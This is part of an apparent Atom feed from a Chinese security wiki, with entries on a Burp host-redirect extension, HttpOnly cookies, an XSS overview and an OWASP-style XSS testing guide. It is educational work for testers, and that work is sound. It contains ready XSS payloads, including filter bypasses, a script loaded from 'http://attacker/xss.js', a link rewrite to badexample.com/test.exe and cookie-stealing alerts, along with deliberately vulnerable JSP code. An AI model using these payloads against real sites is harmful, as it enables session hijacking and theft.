        self._stdout.println(&quot;Extension was unloaded&quot;)
</code></pre>

<p>我是没搞懂这个插件做了什么，诶无所谓，也就是多敲敲代码，熟悉熟悉感觉。</p>

<h2 id="toc_2">traffic_redirector 流量重定向</h2>

<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
# -*- coding:utf-8 -*-

from burp import IBurpExtender
from burp import IHttpListener

HOST_FROM = &quot;www.baidu.com&quot;
HOST_TO = &quot;www.zhihu.com&quot;

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        # 获取扩展helpers对象
        self._helpers = callbacks.getHelpers()
        # 设置扩展名
        callbacks.setExtensionName(&quot;Traffic redirector&quot;)
        # 将自己注册为HTTP侦听器
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolsFlag, messageIsRequest, messageInfo):
        # 只获取请求
        if not messageIsRequest:
            return
        # 获取http服务的请求
        httpService = messageInfo.getHttpService()
        # 如果主机是HOST_FROM则将它改成HOST_TO
        if (HOST_FROM == httpService.getHost()):
            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,
                httpService.getPort(), httpService.getProtocol()))
</code></pre>

<p>这个插件简单来说就是，把请求中的host部分修改掉。比如上述代码会监听所有host为百度的请求，一旦出现，就会把host改成知乎。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HttpOnly]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490848.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490848.html</id>
    <content type="html"><![CDATA[
<p>HttpOnly是 Set-Cookie HTTP响应头中包含的附加标志。生成cookie时使用httponly标志有助于降低客户端脚本访问受保护cookie的风险。</p>

<p>如果HTTP响应头中包含HttpOnly标志，则无法通过客户端脚本访问cookie。因此即使存在xss跨站脚本漏洞，并且用户意外访问到恶意链接，浏览器也不会向第三方透露cookie（前提是浏览器支持HttpOnly）。</p>

<p>参考链接：</p>

<blockquote>
<p><a href="https://www.owasp.org/index.php/HttpOnly">https://www.owasp.org/index.php/HttpOnly</a></p>
</blockquote>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[xssing.org跨站的艺术]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490829.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490829.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>这个网站太棒了，强烈推荐阅读<br/>
<a href="https://xssing.org/%E9%A6%96%E9%A1%B5">xssing.org跨站的艺术</a>若不能直接访问请使用科学上网工具。</p>
</blockquote>

<h1 id="toc_0">什么是XSS？</h1>

<h1 id="toc_1">概述</h1>

<p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击.</p>

<p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p>

<p>攻击者可以使用XSS发送恶意脚本给没有任何防备的用户。终端用户浏览器无法知道不应该信任叫嗯,而是执行了该脚本。因为它认为脚本来自可信的源,恶意脚本可以访问任何Cookies,会话令牌,或其浏览器和网站保留使用的他敏感信息。这些脚本甚至可以重写HTML页面的内容。更多的内容可以阅读本站其他内容。</p>

<h1 id="toc_2">详细介绍</h1>

<p>跨站脚本攻击在以下情况出现:</p>

<ol>
<li>Web应用程序通过不可信的来源进行数据输入，最常见是的Web请求(输入，比如如GET访问某Web应用的url，通过参数提交数据,比如提交input=<script>alert(0);&lt;/ script&gt;)。</li>
<li>恶意数据包含在动态内容内在没有进行校验的情况下发送给用户(输出，比如提交的input的值在没有校验的情况下，用户访问页面，浏览器直接渲染了input的值执行了JS，导致弹窗)。</li>
</ol>

<p>发送到Web浏览器的恶意内容通常是以JavaScript代码的形式，当然也可以包括HTML，Flash或任何浏览器可以执行的其他类型的代码。基于XSS的攻击种类几乎是无限的，但它们通常包括发送隐私数据给攻击者，如cookies或其他会话信息；重定向受害者访问攻击者控制的页面；或者利用网站漏洞在用户机器上执行其他恶意操作。</p>

<h2 id="toc_3">存储型和反射型XSS攻击</h2>

<p>XSS攻击通常可以分为两类：存储型和反射型（也称持久性和非持久性）。还有第三种相对少为认知的XSS攻击类型，叫做DOM XSS ,具体可以点击这里阅读。</p>

<p>同时最近还有一种XSS攻击类型被提出来，突变XSS，不过个人觉得突变XSS不合适作为第四种XSS攻击类型，因为这种突变XSS可以出现在以上三种类型的XSS里，不过比较特殊，我们同样也在这里进行单独介绍（Fooying注）。</p>

<h2 id="toc_4">存储型XSS攻击</h2>

<p>存储型攻击是指那些被注入脚本将被永久保存在目标服务器上，比如在数据库中，在消息板块，访客日志，注释字段等。受害人请求存储信息时，将再次检索到恶意脚本(比如，在留言板提交XSS攻击代码，会存储到数据库，当再次访问留言板会请求数据库中的留言信息，就会连同XSS攻击代码一起检索出来在页面展示，使得受害者再次被攻击)。存储型XSS有时也被称为持久性或Type-I XSS。</p>

<h2 id="toc_5">反射型XSS攻击</h2>

<p>反射型攻击是指那些被注入脚本反射出Web服务器，比如在一个错误信息、搜索结果，或者其他任何的包括一些或所有的输入作为请求的一部分发送到服务器的响应。反射型攻击是通过其他途径送达到受害者，比如一封邮件的内容，或者一些其他的网站。当用户被诱骗点击一个恶意链接，提交一个特制的表单，甚至只是浏览到恶意网站，被注入的脚本行进到有漏洞的网站，将攻击反射回用户浏览器。然后浏览器执行代码，因为它来自于一个“可信”的服务器。反射型XSS有时也被称为非持久性或Type-II XSS.</p>

<h2 id="toc_6">其他类型的XSS漏洞的</h2>

<p>除了反射型和存储型XSS,其他类型的XSS，Amit Klein在2005年发现DOM XSS。除此之外，推荐关于XSS分类描述的文章：XSS分类，它涵盖了所有这些方面的XSS，组成了矩阵，存储vs反射型XSS，以及服务端和客户端XSS，DOM XSS是客户端XSS。</p>

<h2 id="toc_7">XSS攻击结果</h2>

<p>无论是存储型还是反射型（或DOM XSS）的攻击结果都是相同的。不同的是Payload如何有效的到达服务器。不要错误的认为，一个“read only”或“brochureware”网站不容易受到严重的反射型XSS攻击。XSS可以引起终端用户的各种问题，包括不同的严重成都。最严重的XSS攻击涉及用户的会话cookie的披露，使攻击者劫持用户的会话和接管帐户。其他破坏性攻击包括终端用户的文件披露，特洛伊木马程序的安装，将用户重定向到其他网页或网站，或修改内容介绍。XSS漏洞允许攻击者修改新闻稿或新闻项目可以影响一个公司的股票价格或减少消费者的信心。一个药品网站XSS漏洞可能允许攻击者修改剂量信息导致过量。更多关于这些类型的攻击请看内容欺骗。</p>

<h2 id="toc_8">如何确定存在漏洞</h2>

<p>XSS漏洞比较难以识别和从Web应用程序中删除。发现漏洞的最佳方法是进行的代码的安全审计，搜索一个HTTP请求中可能进入HTML输出的所有输入点。值得注意的是，各种不同的HTML标签可以用来发送一个恶意的JavaScript。Nessus, Nikto以及其他的一些扫描器，可以用来扫描检测XSS，不过效果有限。如果一个网站的某部分存在漏洞，那么很有可能还有其他的问题。</p>

<h2 id="toc_9">如何防范XSS</h2>

<p>XSS防御的相关内容位于OWASP XSS防范备忘录 .</p>

<p>另外，最主要的是关闭掉你所有Web服务对HTTP回调的支持。攻击者可以窃取cookie数据通过JavaScript，即使document.cookie被禁用或不支持客户端。用户可以在论坛发布一个恶意脚本，当其他人点击链接，异步回调请求就会被触发，用来收集来自服务器的用户的cookie信息，然后发送到另一个接收地址，这样攻击者就可以进行一个会话劫持攻击。关闭掉你所有Web服务对HTTP回调的支持是很容易的。</p>

<p>OWASP ESAPI project已经开发了一套可重用的安全组件。包含多种编程语言，包括验证和转义来防止参数篡改和XSS攻击注射。此外，OWASP WebGoat Project训练应用，有跨站点脚本和数据编码的训练经验。</p>

<h2 id="toc_10">XSS语句</h2>

<p><strong>属性中使用脚本的XSS</strong><br/>
XSS攻击可能在非<script></script> 标签中发生. 其他标签也可以做同样事，比如:</p>

<p><code>&lt;body onload=alert(&#39;test1&#39;)&gt;</code><br/>
或其他属性，如:onmouseover,onerror.onmouseover</p>

<p><code>&lt;b onmouseover=alert(&#39;Wufff!&#39;)&gt;click me!&lt;/b&gt;</code><br/>
onerror</p>

<p><code>&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;</code></p>

<p><strong>利用XSS脚本通过编码的URI方案</strong><br/>
如果我们需要绕过Web应用过滤器，我们可以尝试编码字符串，比如：a=A (UTF-8),在img标签中使用：</p>

<p><code>&lt;IMG SRC=jAvascript:alert(&#39;test2&#39;)&gt;</code><br/>
有许多不同的UTF-8编码符号可以给我们更多的可能性。</p>

<p><strong>XSS利用代码的编码</strong><br/>
在META标签，我们可以对我们的脚本进行base64编码，这样就不用输入alert()字符。这个方法的更多信息参考RFC 2397</p>

<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; <br/>
CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&gt;</code></p>

<p>这些以及其他的例子可以在OWASP XSS Filter Evasion Cheat Sheet查看。这是一个真正的备用XSS攻击代码的百科</p>

<h1 id="toc_11">例子</h1>

<p>跨站点脚本攻击可能发生在任何地方，可能是恶意用户被允许发送非规范内容到一个可信的网站给其他合法用户。最常见的例子发生在网站公告板，提供基于Web的邮件列表的功能</p>

<h2 id="toc_12">例子 1</h2>

<p>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user. 下面的JSP代码块从一个HTTP请求读取employee ID, eid，并展示给用户。</p>

<pre class="line-numbers"><code class="language-text">    &lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt; 
    ... 
    Employee ID: &lt;%= eid %&gt;
</code></pre>

<p>如果eid仅包含标准字母数字文本，则此示例中的代码可正常运行。如果eid具有包含元字符或源代码的值，则代码将在Web浏览器显示HTTP响应时执行。</p>

<p>最初，这似乎不是一个漏洞。毕竟，为什么有人会输入导致恶意代码在自己的计算机上运行的URL？真正的危险是攻击者会创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者点击该链接时，他们会无意中通过易受攻击的Web应用程序将恶意内容反映回自己的计算机。这种利用易受攻击的Web应用程序的机制称为反射型XSS。</p>

<h2 id="toc_13">例子 2</h2>

<p>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee&#39;s name.</p>

<pre class="line-numbers"><code class="language-jsp">    &lt;%...
     Statement stmt = conn.createStatement(); 
     ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid); 
     if (rs != null) { 
      rs.next(); 
      String name = rs.getString(&quot;name&quot;); 
    %&gt; 
    Employee Name: &lt;%= name %&gt;
```

以上，是首页的部分内容，首页还有很多的参考链接，这些链接都非常有价值，可是不好copy，所以请读者自行前往原网站欣赏。
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[xss检测]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490805.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490805.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">反射型xss</h2>

<p>1、检测输入向量，确定所有web应用程序的用户定义变量以及如何输入他们，包括显而易见的、http参数、post数据、隐藏的表单字段值等。</p>

<p>2、分析每个输入向量并注入payload以检测潜在的漏洞。</p>

<p>3、分析结果并确定是否存在具有实际影响的漏洞。</p>

<ul>
<li><p>没有任何防御的情况下</p>
<p>直接访问即会弹窗</p>
<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
</code></pre>
<p>下面这段代码会导致用户单击测试人员提供的链接，即葱他控制的站点下载文件test.exe。</p>
<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName(&quot;a&quot;); 
AllLinks[0].href = &quot;http://badexample.com/test.exe&quot;; }&lt;/script&gt; 
</code></pre></li>
<li><p>标记属性值</p>
<p>有些情况下可以不使用<code>&lt;script&gt;</code>标签的情况下执行xss漏洞利用，甚至不使用通常过滤的 &lt;&gt; 和 / 等字符。</p>
<p>例如，Web应用程序可以使用用户输入值来填充属性，如以下代码所示：</p>
<pre class="line-numbers"><code class="language-javascript">&lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;INPUT_FROM_USER&quot;&gt;
</code></pre>
<p>然后攻击者可以提交以下代码：</p>
<pre class="line-numbers"><code class="language-javascript">&quot; onfocus=&quot;alert(document.cookie)
</code></pre></li>
<li><p>不同的语法或编码</p>
<p>通常可以使用这种方法来绕过一些过滤器</p>
<p>代码示例：</p></li>
</ul>

<pre class="line-numbers"><code class="language-javascript">  &quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
  &quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
  &quot;%3cscript%3ealert(document.cookie)%3c/script%3e
</code></pre>

<ul>
<li><p>绕过非递归过滤器</p>
<p>有时，过滤器只清理一次，而不是递归执行</p>
<pre class="line-numbers"><code class="language-javascript">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
</code></pre></li>
<li><p>包含外部脚本</p>
<p>现在假设目标站点的开发人员实现了以下代码来保护输入不包含外部脚本：</p></li>
</ul>

<pre class="line-numbers"><code class="language-text">&lt;?
   $re = &quot;/&lt;script[^&gt;]+src/i&quot;;

   if (preg_match($re, $_GET[&#39;var&#39;])) 
   {
      echo &quot;Filtered&quot;;
      return; 
   }
   echo &quot;Welcome &quot;.$_GET[&#39;var&#39;].&quot; !&quot;;
?&gt;
</code></pre>

<p>这种方案中，有一个正则表达式检测是否在 <code>&lt;script</code> 和 <code>&gt;</code> 之间插入了除 src 之外的任何其他内容。这对</p>

<pre class="line-numbers"><code class="language-javascript">&lt;script src=&quot;http://attacker/xss.js&quot;&gt;&lt;/script&gt;
</code></pre>

<p>这种表达式特别有效。</p>

<p>但是可以使用以下方式绕过：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/?var=&lt;SCRIPT%20a=&quot;&gt;&quot;%20SRC=&quot;http://attacker/xss.js&quot;&gt;&lt;/SCRIPT&gt; 
</code></pre>

<ul>
<li>HTTP参数污染(HPP)</li>
</ul>

<p>这种规避技术包括在具有相同名称的多个参数之间拆分攻击向量。对每个参数值的操纵取决于每个web技术如何解析这些参数，因此这种规避不是总是可行的。</p>

<p>定向攻击代码：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;
</code></pre>

<p>使用HPP攻击：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;
</code></pre>

<ul>
<li>通常使用burp的主动扫描，即可检测出大部分情况下的反射型xss，而存储型xss目前还没有比较好的检测方法。</li>
</ul>

<h2 id="toc_1">存储型xss</h2>

<ul>
<li><p>输入表格</p></li>
<li><p>存储型xss能不能成功主要取决于能不能规避过滤器。</p></li>
<li><p>上传文件</p>
<p>如果web应用程序允许文件上传，那么检查是否可以上载html内容就很重要。如果允许html或者txt文件，则可以在上载的文件中注入xss有效载荷。还应该验证文件上载是否允许设置任意MIME类型。</p>
<p>考虑以下用于文件上传的 HTTP POST 请求：</p>
<pre class="line-numbers"><code class="language-http">POST /fileupload.aspx HTTP/1.1
[…]<br/>
Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.txt&quot;<br/>
Content-Type: text/plain<br/>
test
</code></pre>
<p>这种设计缺陷可以在浏览器 MIME 错误处理攻击中利用。例如，像jpg、gif这样的文件可以包含在浏览器加载时执行xss的有效载荷。当images、gif这样的图像的MIME类型可以设置为text/html时，这是可能的。这种情况下，客户端浏览器将文件视为HTML。</p>
<p>HTTP POST 请求伪造:</p>
<pre class="line-numbers"><code class="language-http">Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;
Content-Type: text/html<br/>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre></li>
<li><p>测试应用程序如何处理用户输入</p>
<p>可以执行以下步骤:</p>
<ul>
<li>使用前端应用程序并输入带有特殊/无效字符的输入</li>
<li>分析应用程序响应</li>
<li>确定输入验证控件存在</li>
<li>访问后端系统并检查输入是否存储以及如何存储</li>
<li>分析源代码并了解应用程序如何呈现存储的输入</li>
</ul></li>
<li><p>如果源码可用，则应分析输入表单中使用的所有变量，特别是PHP、ASP和JSP等编程语言使用预定义的变量/函数来存储来自HTTP GET和POST请求的输入。</p>
<p>下表总结了在分析源代码时要查看的一些特殊变量和函数：</p>
<table>
<thead>
<tr>
<th>语言</th>
<th>PHP</th>
<th>ASP</th>
<th>JSP</th>
</tr>
</thead>
<tbody>
<tr>
<td>变量函数</td>
<td>$_GET —— HTTP GET变量</td>
<td>Request.QueryString —— HTTP GET</td>
<td>doGet, doPost servlets —— HTTP GET 和 POST</td>
</tr>
<tr>
<td></td>
<td>$_POST—— HTTP POST变量</td>
<td>Request.Form ——  HTTP POST</td>
<td>request.getParameter —— HTTP GET/POST 变量</td>
</tr>
<tr>
<td></td>
<td>$_REQUEST —— HTTP POST, GET 和 COOKIE变量</td>
<td>Server.CreateObject —— 用来上传文件</td>
<td></td>
</tr>
<tr>
<td></td>
<td>$_FILES —— HTTP文件上传变量</td>
<td></td>
<td></td>
</tr>
</tbody>
</table></li>
</ul>

<h2 id="toc_2">DOM型xss</h2>

<ul>
<li>举个例子：</li>
</ul>

<p>假如我们访问一个页面: <code>http://www.example.com/welcome.html</code></p>

<pre class="line-numbers"><code class="language-markup">&lt;HTML&gt;
&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;
Hi
&lt;SCRIPT&gt;
var pos=document.URL.indexOf(&quot;name=&quot;)+5;
document.write(document.URL.substring(pos,document.URL.length));
&lt;/SCRIPT&gt;
&lt;BR&gt;
Welcome to our system
…
&lt;/HTML&gt;
</code></pre>

<p>此页面将用于欢迎用户，例如:</p>

<p><code>http://www.example.com/welcome.html?name=lonelyor</code></p>

<p>但是请求如下: </p>

<p><code>http://www.example.com/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>

<p>这样会触发dom型xss的条件。让我们看看为什么:</p>

<p>当受害者的浏览器像 <code>www.example.con</code> 发送http请求，并接受上述(静态)html页面。然后受害者的浏览器会开始将html解析为dom，dom包含一个名为 document 的对象，该对象包含一个名为 URL 的属性，并且此属性使用当前页面的 URL 填充来作为 dom 创建的一部分。当解析器达到javascript代码时，它会执行</p>

<pre class="line-numbers"><code class="language-javascript">var pos=document.URL.indexOf(&quot;name=&quot;)+5;
document.write(document.URL.substring(pos,document.URL.length));
</code></pre>

<p>并修改页面的原始html。这种情况下，代码引用 document.URL，因此，此name字符串的一部分将嵌入在html中并立即解析，这时会在同一页面执行 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，因此是xss条件。</p>

<ul>
<li><p>注意</p>
<ul>
<li>恶意代码在任何时候都没有嵌入到原始html页面中(这与反射和存储型不同)</li>
<li>此漏洞仅在浏览器不修改url字符时才有效。当url不直接在地址栏中输入时，火狐会自动编码 document.url 中的 &lt;和&gt;(分别为 %3C 和 %3E )，因此火狐不易收到攻击。IE6.0因为不编码这些所以容易被攻击。当然，直接嵌入HTML只是一个攻击挂载点，有各种场景不需要&lt;和&gt;，因此Mozilla通常不能免受此攻击。</li>
</ul></li>
<li><p>规避服务器检测</p>
<p>显然上面的方法还是把payload发送到了服务器，这样后端还是可以检测到，不过，我们可以规避这种检测。</p>
<p>新的payload如下:</p>
<p><code>http://www.example.com/welcome.html#name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p>注意文件后面的数学符号(#)，他告诉浏览器，#后面的内容都是片段，即不是查询的一部分，火狐和IE6.0不会将片段发送到服务器，因此服务器将看到相当于<code>http://www.example.com/welcome.html</code>，所以服务器不会看到有效载荷。</p></li>
</ul>

<h2 id="toc_3">参考链接</h2>

<p><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">反射性xss</a></p>

<p><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">存储型xss</a></p>

<p><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">dom型xss</a></p>

]]></content>
  </entry>
  
</feed>
